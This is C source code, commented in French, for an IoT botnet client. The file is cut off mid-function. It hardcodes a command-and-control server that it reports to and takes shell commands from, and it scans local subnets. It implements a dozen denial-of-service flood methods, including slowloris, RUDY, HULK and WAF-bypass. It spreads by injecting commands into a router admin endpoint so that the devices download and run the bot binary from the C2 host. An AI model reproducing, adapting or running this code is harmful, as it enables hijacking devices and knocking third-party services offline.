/* Définitions nécessaires pour la compilation croisée */
#define _GNU_SOURCE
#define _DEFAULT_SOURCE
#define __USE_GNU

/* Contournement pour les problèmes de asm/socket.h */
#if defined(__SPARC__) || defined(__MIPS__) || defined(__ARM__) || defined(__PPC__)
/* Définir les constantes nécessaires pour éviter d'inclure asm/socket.h */
#define __ASM_GENERIC_SOCKET_H
#define FIONREAD 0x541B
#endif

/* Nous n'utilisons pas SOCK_NONBLOCK directement, nous utilisons fcntl() à la place */

/* Configuration */
#define BUFFER_SIZE 1024
#define MAX_PACKET_SIZE (5 * 1024 * 1024)  // 5MB max
#define MIN_PACKET_SIZE (1024)             // 1KB min

/* Utilisation de fcntl() pour les sockets non-bloquants au lieu de SOCK_NONBLOCK */

/* Headers système */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>

/* Socket headers - ordre spécifique pour éviter les problèmes de compilation croisée */
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Headers optionnels (si disponibles) */
#ifdef __linux__
#ifndef __SPARC__
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#endif
#endif

/* Structures et constantes manquantes pour certaines architectures */
#ifndef IPPROTO_TCP
#define IPPROTO_TCP 6
#endif

#ifndef IPPROTO_UDP
#define IPPROTO_UDP 17
#endif

#ifndef IPPROTO_ICMP
#define IPPROTO_ICMP 1
#endif

/* Définitions de socket manquantes pour certaines architectures */
#ifndef AF_INET
#define AF_INET 2
#endif

#ifndef SOCK_STREAM
#define SOCK_STREAM 1
#endif

#ifndef SOCK_DGRAM
#define SOCK_DGRAM 2
#endif

#ifndef SOCK_RAW
#define SOCK_RAW 3
#endif

#include <dirent.h>
#include <ctype.h>

// Déclarations des fonctions
void ddos_attack(int c2_socket, char* target, int port, int duration, char* method);
void http_flood(char* target, int port, int duration);
void syn_flood(char* target, int port, int duration);
void udp_flood(char* target, int port, int duration);
void persist(void);

#define C2_SERVER "51.68.128.169"
#define C2_PORT 1337
#define BUFFER_SIZE 1024
#define CMD_SIZE 512
#define DEVICE_ID_SIZE 64

// Identifiant unique pour ce bot
char device_id[DEVICE_ID_SIZE] = {0};

// Fonction pour exécuter une commande shell et retourner la sortie
char* execute_command(char* command) {
    FILE* fp;
    char* output = malloc(BUFFER_SIZE * 10);
    char buffer[BUFFER_SIZE];
    
    if (!output) return NULL;
    memset(output, 0, BUFFER_SIZE * 10);
    
    fp = popen(command, "r");
    if (fp == NULL) {
        sprintf(output, "Failed to execute command\n");
        return output;
    }
    
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(output, buffer);
    }
    
    pclose(fp);
    return output;
}

// Fonction pour scanner un sous-réseau à la recherche d'hôtes vulnérables
void scan_network(int c2_socket, char* subnet) {
    char command[BUFFER_SIZE];
    char* output;
    
    // Construire la commande de scan
    sprintf(command, "for i in {1..254}; do ping -c 1 -W 1 %s.$i | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" & done", subnet);
    
    // Exécuter la commande et obtenir la sortie
    output = execute_command(command);
    
    // Envoyer les résultats au serveur C2
    if (output) {
        char message[BUFFER_SIZE * 10];
        sprintf(message, "SCAN_RESULT|%s", output);
        send(c2_socket, message, strlen(message), 0);
        free(output);
    }
}

// Fonction pour effectuer une attaque HTTP flood
void http_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    char request[BUFFER_SIZE];
    
    // Liste d'User-Agents pour contourner les filtres
    char *user_agents[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
    };
    
    // Liste de chemins pour varier les requêtes
    char *paths[] = {
        "/", "/index.html", "/home", "/about", "/contact", "/products", "/services",
        "/login", "/register", "/admin", "/api/v1/users", "/api/v1/products", "/search",
        "/blog", "/news", "/events", "/gallery", "/faq", "/support", "/download"
    };
    
    // Configurer l'adresse
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        // Sélectionner un User-Agent et un chemin aléatoire
        char *user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
        char *path = paths[rand() % (sizeof(paths) / sizeof(paths[0]))];
        
        // Construire la requête HTTP avec des paramètres aléatoires pour contourner le cache
        snprintf(request, BUFFER_SIZE,
            "GET %s?id=%d&nocache=%d HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Referer: http://%s/\r\n"
            "Connection: keep-alive\r\n\r\n",
            path, rand(), rand(), target, user_agent, target);
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            // Rendre le socket non-bloquant
            int flags = fcntl(sock, F_GETFL, 0);
            fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) >= 0) {
                send(sock, request, strlen(request), 0);
            }
            // Ne pas fermer le socket immédiatement pour maintenir la connexion ouverte
            // On le fermera après un court délai
        }
        usleep(10000); // 10ms délai
        
        // Fermer les sockets ouverts après un certain temps
        if (rand() % 10 == 0) {
            close(sock);
        }
    }
}

// Fonction pour effectuer une attaque SYN flood
void syn_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    
    // Créer un socket raw
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1) {
        return;
    }
    
    // Configurer l'adresse cible
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        // Envoyer des paquets SYN
        sendto(sock, NULL, 0, 0, (struct sockaddr*)&addr, sizeof(addr));
        usleep(1000);
    }
    close(sock);
}

// Fonction pour effectuer une attaque UDP flood
void udp_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    char packet[1024];
    
    // Remplir le paquet avec des données aléatoires
    for (int i = 0; i < sizeof(packet); i++) {
        packet[i] = rand() % 255;
    }
    
    // Créer le socket UDP
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return;
    
    // Configurer l'adresse cible
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&addr, sizeof(addr));
        usleep(100);
    }
    close(sock);
}

// Fonction pour effectuer une attaque TCP flood
void tcp_flood(char* target, int port, int duration) {
    int sock;
    struct sockaddr_in addr;
    
    // Configurer l'adresse cible
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock != -1) {
            if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != -1) {
                char *data = malloc(1024);
                if (data) {
                    for (int i = 0; i < 1024; i++) {
                        data[i] = rand() % 256;
                    }
                    send(sock, data, 1024, 0);
                    free(data);
                }
            }
            close(sock);
        }
        usleep(100);
    }
}

// Fonction pour effectuer une attaque DDoS
#ifndef __USE_MISC
#define __USE_MISC
#endif

#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif

void ddos_attack(int c2_socket, char* target, int port, int duration, char* method) {
    struct sockaddr_in target_addr;
    char message[BUFFER_SIZE];
    char* attack_packet = NULL;
    int packet_size = 0;
    int sock;
    time_t start_time;
    
    // Convertir la méthode en minuscules pour une comparaison insensible à la casse
    for (int i = 0; method[i]; i++) {
        method[i] = tolower(method[i]);
    }
    
    // Initialisation
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    target_addr.sin_addr.s_addr = inet_addr(target);
    start_time = time(NULL);
    
    // Tailles des paquets pour les attaques
    int packet_sizes[] = {MAX_PACKET_SIZE, 512*1024, 64*1024, MIN_PACKET_SIZE};
    
    for (int i = 0; i < sizeof(packet_sizes)/sizeof(int); i++) {
        packet_size = packet_sizes[i];
        attack_packet = (char*)malloc(packet_size);
        if (attack_packet != NULL) {
            break;
        }
    }
    
    if (attack_packet == NULL) {
        snprintf(message, sizeof(message), "DDOS_ERROR|%s:%d|NO_MEMORY", target, port);
        send(c2_socket, message, strlen(message), 0);
        return;
    }
    
    // Remplir le paquet avec des données aléatoires
    for (int i = 0; i < packet_size; i++) {
        attack_packet[i] = rand() % 256;
    }
    
    // Informer le serveur C2 du début de l'attaque
    snprintf(message, sizeof(message), "DDOS_STARTED|%s:%d|%s|%d seconds", target, port, method, duration);
    send(c2_socket, message, strlen(message), 0);
    
    if (strcmp(method, "http") == 0) {
        // Attaque HTTP optimisée pour IoT
        char *paths[] = {"/", "/index.php", "/home", "/api", "/login"};
        char *user_agents[] = {
            "Mozilla/5.0",
            "Googlebot/2.1",
            "bingbot/2.0",
            "Apache-HttpClient/4.5.2",
            "curl/7.64.1"
        };
        
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock != -1) {
                // Rendre le socket non-bloquant avec fcntl
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
            }
            if (sock != -1) {
                if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                    char request[256];
                    snprintf(request, sizeof(request),
                        "GET %s?%d HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: close\r\n\r\n",
                        paths[rand() % 5],
                        rand(),
                        target,
                        user_agents[rand() % 5]);
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            usleep(10000); // 10ms délai
        }
    }
    else if (strcmp(method, "slowloris") == 0) {
        // Slowloris - garde les connexions ouvertes longtemps
        int max_sockets = 128;
        int *sockets = (int*)malloc(max_sockets * sizeof(int));
        int active_sockets = 0;
        
        while (time(NULL) - start_time < duration) {
            // Maintenir ~128 connexions
            while (active_sockets < max_sockets) {
                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock != -1) {
                    // Rendre le socket non-bloquant avec fcntl
                    int flags = fcntl(sock, F_GETFL, 0);
                    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                        char partial_header[64];
                        snprintf(partial_header, sizeof(partial_header),
                            "GET / HTTP/1.1\r\n"
                            "Host: %s\r\n", target);
                        send(sock, partial_header, strlen(partial_header), 0);
                        sockets[active_sockets++] = sock;
                    } else {
                        close(sock);
                    }
                }
            }
            
            // Envoyer des en-têtes partiels pour maintenir les connexions
            for (int i = 0; i < active_sockets; i++) {
                send(sockets[i], "X-a: b\r\n", 8, 0);
            }
            
            sleep(10); // Attendre 10s avant la prochaine vague
            
            // Nettoyer les sockets morts
            for (int i = 0; i < active_sockets; i++) {
                if (send(sockets[i], "", 0, 0) < 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    i--;
                }
            }
        }
        
        // Nettoyer
        for (int i = 0; i < active_sockets; i++) {
            close(sockets[i]);
        }
        free(sockets);
    }
    else if (strcmp(method, "ack") == 0) {
        // ACK flood
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock != -1) {
                // Rendre le socket non-bloquant
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                send(sock, attack_packet, 64, 0); // Juste 64 octets
                close(sock);
            }
            usleep(5000); // 5ms délai
        }
    }
    else if (strcmp(method, "mix") == 0) {
        // Mix d'attaques optimisé pour performance maximale
        int num_threads = 4; // Nombre de threads d'attaque
        int active_sockets[4] = {0}; // Sockets par thread
        
        while (time(NULL) - start_time < duration) {
            for (int t = 0; t < num_threads; t++) {
                // Alterner entre TCP et UDP
                int proto = (t + (int)time(NULL)) % 2;
                sock = socket(AF_INET, 
                            proto ? SOCK_STREAM : SOCK_DGRAM,
                            proto ? 0 : IPPROTO_UDP);
                
                // Rendre le socket non-bloquant avec fcntl si c'est TCP
                if (proto && sock != -1) {
                    int flags = fcntl(sock, F_GETFL, 0);
                    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                }
                
                if (sock != -1) {
                    if (proto) { // TCP
                        if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                            send(sock, attack_packet, packet_size, 0);
                        }
                    } else { // UDP
                        sendto(sock, attack_packet, packet_size, 0,
                               (struct sockaddr*)&target_addr, sizeof(target_addr));
                    }
                    
                    if (active_sockets[t]) {
                        close(active_sockets[t]);
                    }
                    active_sockets[t] = sock;
                }
            }
            usleep(1000); // 1ms délai
        }
        
        // Nettoyer les sockets
        for (int t = 0; t < num_threads; t++) {
            if (active_sockets[t]) {
                close(active_sockets[t]);
            }
        }
    }
    else if (strcmp(method, "udp") == 0) {
        // Attaque UDP améliorée avec paquets de 5MB
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock != -1) {
            while (time(NULL) - start_time < duration) {
                sendto(sock, attack_packet, packet_size, 0,
                       (struct sockaddr*)&target_addr, sizeof(target_addr));
                usleep(1000); // 1ms délai
            }
            close(sock);
        }
    }
    else if (strcmp(method, "syn") == 0) {
        // SYN flood - envoie des paquets SYN sans compléter le handshake TCP
        #ifdef __linux__
        // Sur Linux, on peut utiliser des raw sockets pour le SYN flood
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (sock != -1) {
            // Définir les options du socket
            int one = 1;
            if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
                close(sock);
            } else {
                // Créer un paquet SYN basique
                char syn_packet[60]; // En-tête IP (20) + En-tête TCP (40)
                memset(syn_packet, 0, sizeof(syn_packet));
                
                // Remplir avec des données aléatoires pour simuler un paquet SYN
                for (int i = 0; i < sizeof(syn_packet); i++) {
                    syn_packet[i] = rand() % 256;
                }
                
                while (time(NULL) - start_time < duration) {
                    sendto(sock, syn_packet, sizeof(syn_packet), 0,
                           (struct sockaddr*)&target_addr, sizeof(target_addr));
                    usleep(1000);
                }
                close(sock);
            }
        }
        #else
        // Sur les autres systèmes, on simule un SYN flood avec des connexions partielles
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock != -1) {
                // Rendre le socket non-bloquant
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                
                // Initier la connexion mais ne pas la compléter
                connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                // Ne pas fermer le socket pour maintenir l'état SYN_SENT
                // On le fermera à la fin de l'attaque
            }
            usleep(1000);
        }
        #endif
    }
    else if (strcmp(method, "tcp") == 0) {
        // TCP flood - établit de nombreuses connexions TCP complètes
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock != -1) {
                // Rendre le socket non-bloquant
                int flags = fcntl(sock, F_GETFL, 0);
                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                
                // Tenter d'établir la connexion
                if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                    // Envoyer des données aléatoires
                    send(sock, attack_packet, 64, 0);
                }
                close(sock);
            }
            usleep(5000);
        }
    }
    else if (strcmp(method, "icmp") == 0) {
        // ICMP flood (ping flood)
        #ifdef __linux__
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock != -1) {
            // Créer un paquet ICMP echo request basique
            char icmp_packet[64];
            memset(icmp_packet, 0, sizeof(icmp_packet));
            
            // Type 8 = Echo Request
            icmp_packet[0] = 8;
            
            while (time(NULL) - start_time < duration) {
                sendto(sock, icmp_packet, sizeof(icmp_packet), 0,
                       (struct sockaddr*)&target_addr, sizeof(target_addr));
                usleep(1000);
            }
            close(sock);
        }
        #else
        // Sur les autres systèmes, on utilise des commandes ping
        char ping_cmd[256];
        snprintf(ping_cmd, sizeof(ping_cmd), "ping -c 1 -W 1 %s > /dev/null 2>&1 &", target);
        
        while (time(NULL) - start_time < duration) {
            system(ping_cmd);
            usleep(1000);
        }
        #endif
    }
    else if (strcmp(method, "rudy") == 0) {
        // R-U-Dead-Yet - Soumet des formulaires POST très lentement
        int max_sockets = 128;
        int *sockets = (int*)malloc(max_sockets * sizeof(int));
        int active_sockets = 0;
        
        // Préparer l'en-tête de la requête POST
        char post_header[BUFFER_SIZE];
        snprintf(post_header, BUFFER_SIZE,
            "POST /login HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 1000000\r\n\r\n",
            target);
        
        while (time(NULL) - start_time < duration) {
            // Maintenir plusieurs connexions
            while (active_sockets < max_sockets) {
                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock != -1) {
                    // Rendre le socket non-bloquant
                    int flags = fcntl(sock, F_GETFL, 0);
                    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                    
                    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                        // Envoyer l'en-tête POST
                        send(sock, post_header, strlen(post_header), 0);
                        sockets[active_sockets++] = sock;
                    } else {
                        close(sock);
                    }
                }
            }
            
            // Envoyer des données très lentement pour chaque socket
            for (int i = 0; i < active_sockets; i++) {
                // Envoyer un seul caractère à la fois
                send(sockets[i], "A", 1, 0);
            }
            
            // Attendre avant d'envoyer le prochain caractère
            sleep(10);
            
            // Nettoyer les sockets morts
            for (int i = 0; i < active_sockets; i++) {
                if (send(sockets[i], "", 0, 0) < 0) {
                    close(sockets[i]);
                    sockets[i] = sockets[--active_sockets];
                    i--;
                }
            }
        }
        
        // Nettoyer
        for (int i = 0; i < active_sockets; i++) {
            close(sockets[i]);
        }
        free(sockets);
    }
    else if (strcmp(method, "arme") == 0) {
        // ARME - Attaque par amplification de réflexion de mémoire
        // Simuler une attaque d'amplification en envoyant des requêtes qui génèrent de grandes réponses
        
        // Liste de chemins connus pour générer de grandes réponses
        char *amplification_paths[] = {
            "/search?q=", "/api/all", "/products?limit=1000", "/users/list", "/data/export"
        };
        
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock != -1) {
                if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                    // Sélectionner un chemin d'amplification aléatoire
                    char *path = amplification_paths[rand() % (sizeof(amplification_paths) / sizeof(amplification_paths[0]))];
                    
                    // Construire une requête qui génère une grande réponse
                    char request[BUFFER_SIZE];
                    snprintf(request, BUFFER_SIZE,
                        "GET %s%d HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: Mozilla/5.0\r\n"
                        "Accept: */*\r\n\r\n",
                        path, rand(), target);
                    
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            usleep(5000);
        }
    }
    else if (strcmp(method, "hulk") == 0) {
        // HULK - Génère du trafic HTTP unique pour contourner le cache
        int max_connections = 256;
        int active_connections = 0;
        
        while (time(NULL) - start_time < duration) {
            // Limiter le nombre de connexions simultanées
            if (active_connections < max_connections) {
                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock != -1) {
                    // Rendre le socket non-bloquant
                    int flags = fcntl(sock, F_GETFL, 0);
                    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                    
                    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                        // Générer un chemin unique avec des paramètres aléatoires pour contourner le cache
                        char unique_id[32];
                        snprintf(unique_id, sizeof(unique_id), "%d%d%d", rand(), rand(), rand());
                        
                        char request[BUFFER_SIZE];
                        snprintf(request, BUFFER_SIZE,
                            "GET /?id=%s&rnd=%d HTTP/1.1\r\n"
                            "Host: %s\r\n"
                            "User-Agent: Mozilla/5.0 (compatible; HULK/%d.%d)\r\n"
                            "Accept: */*\r\n"
                            "Cache-Control: no-cache\r\n"
                            "Pragma: no-cache\r\n"
                            "X-Request-ID: %s\r\n"
                            "Connection: keep-alive\r\n\r\n",
                            unique_id, rand(), target, rand() % 10, rand() % 10, unique_id);
                        
                        send(sock, request, strlen(request), 0);
                        active_connections++;
                    }
                    // Ne pas fermer le socket pour maintenir la connexion
                }
            }
            
            // Réduire occasionnellement le nombre de connexions actives
            if (rand() % 100 < 10) {
                active_connections = active_connections * 0.9;
            }
            
            usleep(1000);
        }
    }
    else if (strcmp(method, "bypass") == 0) {
        // Bypass - Tente de contourner les protections WAF et anti-DDoS
        // Utilise une combinaison de techniques pour éviter la détection
        
        // Techniques de bypass:
        // 1. Rotation d'User-Agents
        // 2. Variation des en-têtes HTTP
        // 3. Variation des temps entre les requêtes
        // 4. Utilisation de différents chemins
        // 5. Variation des paramètres de requête
        
        char *user_agents[] = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
            "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X)"
        };
        
        char *paths[] = {
            "/", "/index.html", "/home", "/about", "/contact", "/products", "/services"
        };
        
        char *headers[] = {
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate",
            "DNT: 1",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1"
        };
        
        while (time(NULL) - start_time < duration) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock != -1) {
                if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) >= 0) {
                    // Sélectionner des éléments aléatoires
                    char *user_agent = user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))];
                    char *path = paths[rand() % (sizeof(paths) / sizeof(paths[0]))];
                    char *header = headers[rand() % (sizeof(headers) / sizeof(headers[0]))];
                    
                    // Générer des paramètres aléatoires
                    char params[128];
                    snprintf(params, sizeof(params), "?id=%d&page=%d&t=%ld", rand(), rand() % 100, (long)time(NULL));
                    
                    // Construire la requête avec des variations
                    char request[BUFFER_SIZE];
                    snprintf(request, BUFFER_SIZE,
                        "GET %s%s HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "%s\r\n"
                        "Accept: */*\r\n\r\n",
                        path, params, target, user_agent, header);
                    
                    send(sock, request, strlen(request), 0);
                }
                
                // Fermer le socket après un délai aléatoire
                usleep(rand() % 10000 + 1000);
                close(sock);
            }
            
            // Variation du temps entre les requêtes pour éviter la détection
            usleep(rand() % 50000 + 10000);
        }
    }
    
    // Informer le serveur C2 de la fin de l'attaque
    snprintf(message, sizeof(message), "DDOS_COMPLETED|%s:%d|%s", target, port, method);
    send(c2_socket, message, strlen(message), 0);
}

// Fonction pour propager le bot
// Propagation automatique sur le réseau local
void auto_propagate() {
    char localnet[32] = "";
    FILE* f = popen("ip -4 addr | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d'/' -f1 | cut -d'.' -f1-3", "r");
    if (f && fgets(localnet, sizeof(localnet), f)) {
        localnet[strcspn(localnet, "\n")] = 0;
        char ip[64];
        char cmd[CMD_SIZE];
        char base_payload[CMD_SIZE];
        
        // Préparer le payload de base
        snprintf(base_payload, sizeof(base_payload), 
            "rm -rf /var/tmp/bot;%%s http://%s:1337/bot.mips%%s/var/tmp/bot;chmod 777 /var/tmp/bot;/var/tmp/bot mips",
            C2_SERVER);
        
        for (int i = 1; i < 255; i++) {
            snprintf(ip, sizeof(ip), "%s.%d", localnet, i);
            
            // Préparer les commandes
            char wget_cmd[CMD_SIZE];
            char curl_cmd[CMD_SIZE];
            
            snprintf(wget_cmd, sizeof(wget_cmd), base_payload, "wget", " -O ");
            snprintf(curl_cmd, sizeof(curl_cmd), base_payload, "curl -O", ";");
            
            // Essayer wget
            if (snprintf(cmd, sizeof(cmd),
                "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3B%s' > /dev/null 2>&1",
                ip, wget_cmd) < sizeof(cmd)) {
                system(cmd);
            }
            
            // Essayer curl
            if (snprintf(cmd, sizeof(cmd),
                "curl -s -X POST http://%s/boaform/admin/formTracert -d 'target_addr=%%3B%s' > /dev/null 2>&1",
                ip, curl_cmd) < sizeof(cmd)) {
                system(cmd);
            }
            
            // Essayer tftp
            if (snprintf(cmd, sizeof(cmd),
                "tftp %s -c get bot.mips /var/tmp/bot; chmod 777 /var/tmp/bot; /var/tmp/bot mips > /dev/null 2>&1",
                ip) < sizeof(cmd)) {
                system(cmd);
            }
        }
    }
    if (f) pclose(f);
}

void propagate(int c2_socket, char* target) {
    // Propagation classique sur une cible précise (pour compatibilité)
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "wget -q -O- http://%s/boaform/admin/formTracert --post-data 'target_addr=%%3Brm%%20-rf%%20/var/tmp/bot%%3Bwget%%20http://%s:1337/bot.mips%%20-O%%20->/var/tmp/bot%%3Bchmod%%20777%%20/var/tmp/bot%%3B/var/tmp/bot%%20mips' > /dev/null 2>&1", target, C2_SERVER);
    system(cmd);
} 

// Fonction pour collecter des informations sur le système
char* collect_system_info() {
    char* info = malloc(BUFFER_SIZE * 5);
    char* cmd_output;
    
    if (!info) return NULL;
    memset(info, 0, BUFFER_SIZE * 5);
    
    // Obtenir le nom d'hôte
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    sprintf(info, "Hostname: %s\n", hostname);
    
    // Obtenir les informations CPU
    cmd_output = execute_command("cat /proc/cpuinfo | grep 'model name' | head -1");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    // Obtenir les informations mémoire
    cmd_output = execute_command("free -m | head -2");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    // Obtenir les informations réseau
    cmd_output = execute_command("ifconfig | grep inet");
    if (cmd_output) {
        strcat(info, cmd_output);
        free(cmd_output);
    }
    
    return info;
}

// Fonction principale pour se connecter au serveur C2 et traiter les commandes
void connect_to_c2() {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];
    char* system_info;
    
    while (1) {
        // Créer un socket
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            sleep(30);
            continue;
        }
        
        // Configurer l'adresse du serveur C2
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        
        // Convertir l'adresse IP en format binaire
        if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        // Se connecter au serveur C2
        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        // Collecter les informations système
        system_info = collect_system_info();
        
        // Envoyer les informations d'identification
        if (system_info) {
            char bot_id[BUFFER_SIZE * 5];
            sprintf(bot_id, "BOT_CONNECTED|%s", system_info);
            send(sockfd, bot_id, strlen(bot_id), 0);
            free(system_info);
        } else {
            send(sockfd, "BOT_CONNECTED|Unknown Device", 28, 0);
        }
        
        // Boucle principale pour recevoir et exécuter les commandes
        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            
            // Recevoir une commande du serveur C2
            int n = recv(sockfd, buffer, BUFFER_SIZE-1, 0);
            if (n <= 0) {
                break;  // Connexion perdue
            }
            
            buffer[n] = '\0';
            
            // Traiter la commande reçue
